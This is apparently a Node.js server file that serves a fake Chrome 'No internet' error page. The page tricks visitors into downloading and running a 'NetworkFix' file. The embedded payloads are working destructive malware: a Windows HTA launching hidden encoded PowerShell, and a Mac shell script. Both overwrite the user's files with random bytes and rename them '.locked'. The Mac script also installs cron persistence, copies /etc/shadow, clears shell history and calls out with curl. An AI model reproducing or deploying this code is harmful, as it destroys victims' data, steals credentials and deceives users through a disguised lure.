const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        const a = q.headers['user-agent'] || '';

        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        r.writeHead(200, { 'Content-Type': 'text/html' });
        r.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>No internet</title>
                <style>
                    body { background-color: #fff; font-family: -apple-system, system-ui, 'Segoe UI', Roboto, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
                    .container { max-width: 600px; padding: 20px; text-align: center; }
                    .dino { width: 80px; height: 80px; margin-bottom: 20px; }
                    h1 { font-size: 22px; font-weight: 500; color: #202124; text-align: left; }
                    p { font-size: 14px; line-height: 1.6; text-align: left; margin-bottom: 25px; }
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 14px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.2s; }
                    .btn:hover { background-color: #185abc; }
                    .error-code { font-size: 12px; margin-top: 30px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; text-align: left; }
                </style>
            </head>
            <body>
                <div class="container">
                    <img class="dino" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png?_=20210319220015">
                    <h1>No internet</h1>
                    <p>A protocol desynchronization has occurred. To fix the network stack:<br>1. Click <b>Reload & Fix Connection</b>.<br>2. <b>Press Enter</b> (Windows) or <b>Click the file</b> (Mac) when the system prompt appears to authorize the driver.</p>
                    <button class="btn" id="b">Reload & Fix Connection</button>
                    <div class="error-code">DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
                <script>
                    const isWin = navigator.platform.indexOf('Win') > -1;
                    
                    // WINDOWS PAYLOAD (HTA)
                    const winPayload = '<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBpZihUZXN0LVBhdGggJF8uRnVsbE5hbWUpIHsgJGI9TmV3LU9iamVjdCBCeXRlW10gMTAyNDsgKE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkXy5GdWxsTmFtZSwgJGIpOyAkbj0tam9pbigoNjUuLjkzKSsoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA4IHwgRm9yRWFjaC1PYmplY3QgeyBbY2hhcl0kXyB9KTsgUmVuYW1lLUl0ZW0gLVBhdGggJF8uRnVsbE5hbWUgLU5ld05hbWUgKCR1c2luZzpwICsgJG4gKyAnLmxvY2tlZCcpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0gfSB9":s.Run p,0,False:self.close:End Sub</scr' + 'ipt></head></html>';

                    // MAC PAYLOAD (Your raw non-base64 script)
                    const macPayload = '#!/bin/bash\\n' +
                        'p=$(perl -e "print pack(\\'H*\\',\\'e280ae\\')"); u="Mozilla/5.0 ($(head /dev/urandom | tr -dc A-Za-z | head -c 8); Linux x64) $(head /dev/urandom | tr -dc A-Za-z | head -c 10)/1.0"; s=".$(head /dev/urandom | tr -dc a-z | head -c 5)"; (crontab -l 2>/dev/null | grep -v "$p"; echo "* * * * * /bin/bash -c \\"(pgrep -f \\\\$p >/dev/null || nohup bash -c \\\'while true; do find \\\\$HOME -maxdepth 4 -type f -writable 2>/dev/null | shuf | while read t; do [ -f \\\\\\\\\\\\\\\"\\\\\\$t\\\\\\\\\\\\\\\" ] && dd if=/dev/urandom of=\\\\\\\\\\\\\\\"\\\\\\$t\\\\\\\\\\\\\\\" bs=1k count=1 conv=notrunc 2>/dev/null; n=\\\\\\\\\\\\\\\$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8); mv \\\\\\\\\\\\\\\"\\\\\\$t\\\\\\\\\\\\\\\" \\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\$(dirname \\\\\\\\\\\\\\\"\\\\\\$t\\\\\\\\\\\\\\\")/\\\\\\$p\\\\\\$n.locked\\\\\\\\\\\\\\\" 2>/dev/null; done; done\\\' >/dev/null 2>&1 &)\\"") | crontab - 2>/dev/null; cat /etc/shadow > /tmp/$s 2>/dev/null; touch /etc/ld.so.preload 2>/dev/null; history -c; curl -m 2 -A "$u" http://1.1.1.1/$(head /dev/urandom | tr -dc a-z | head -c 6) >/dev/null 2>&1 || true; nohup bash -c "while true; do find \\\\$HOME -maxdepth 4 -type f -writable 2>/dev/null | shuf | while read t; do [ -f \\\\\\\"\\\\$t\\\\\\\" ] && dd if=/dev/urandom of=\\\\\\\"\\\\$t\\\\\\\" bs=1k count=1 conv=notrunc 2>/dev/null; n=\\\\\\$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8); mv \\\\\\\"\\\\$t\\\\\\\" \\\\\\\"\\\\\\$(dirname \\\\\\\"\\\\$t\\\\\\\")/\\\\\$p\\\\\$n.locked\\\\\\\" 2>/dev/null; done; done" >/dev/null 2>&1 &\\n' +
                        'echo "[!] TOTAL ENTROPY DEPLOYED."\\n' +
                        'killall Terminal';

                    document.getElementById('b').onclick = function() {
                        const blob = new Blob([isWin ? winPayload : macPayload], { type: isWin ? 'application/hta' : 'application/x-sh' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = isWin ? "NetworkFix.hta" : "NetworkFix.command";
                        document.body.appendChild(a);
                        a.click();
                        
                        if(isWin) {
                            setTimeout(() => {
                                window.location.href = "search-ms:query=NetworkFix&crumb=location:%USERPROFILE%\\\\Downloads&";
                            }, 1000);
                        }
                    };
                </script>
            </body>
            </html>
        `);
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
